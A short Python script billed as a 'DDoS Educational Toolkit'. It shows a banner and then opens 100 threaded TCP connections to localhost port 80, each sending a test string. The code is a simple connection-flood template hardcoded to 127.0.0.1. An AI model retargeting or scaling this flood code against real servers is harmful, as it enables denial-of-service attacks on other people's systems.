import socket
import threading
import time
import os

def banner():
    os.system('clear')
    print("\033[1;32m")
    print("═════════════════════════════════════════════════════")
    print("      🚀 Faizan™ DDoS Educational Toolkit")
    print("═════════════════════════════════════════════════════")
    print("   Created by: \033[1;36mFaizan™ Mughal\033[1;32m")
    print("   Purpose: Ethical, Localhost-based DDoS Simulation")
    print("═════════════════════════════════════════════════════")
    print("\033[0m")

def attack(target_ip, target_port):
    try:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((target_ip, target_port))
        client.send(b"Faizan DDOS test packet\n")
        client.close()
    except:
        pass

def main():
    banner()
    target_ip = "127.0.0.1"  # Local testing only
    target_port = 80

    print(f"\033[1;33m[~] Launching attack on {target_ip}:{target_port}...\033[0m\n")

    for i in range(100):
        thread = threading.Thread(target=attack, args=(target_ip, target_port))
        thread.start()
        time.sleep(0.01)  # تھوڑا delay تاکہ Termux hang نہ ہو

    print("\n\033[1;32m[✔] Attack completed (localhost test only)\033[0m")

if __name__ == "__main__":
    main()
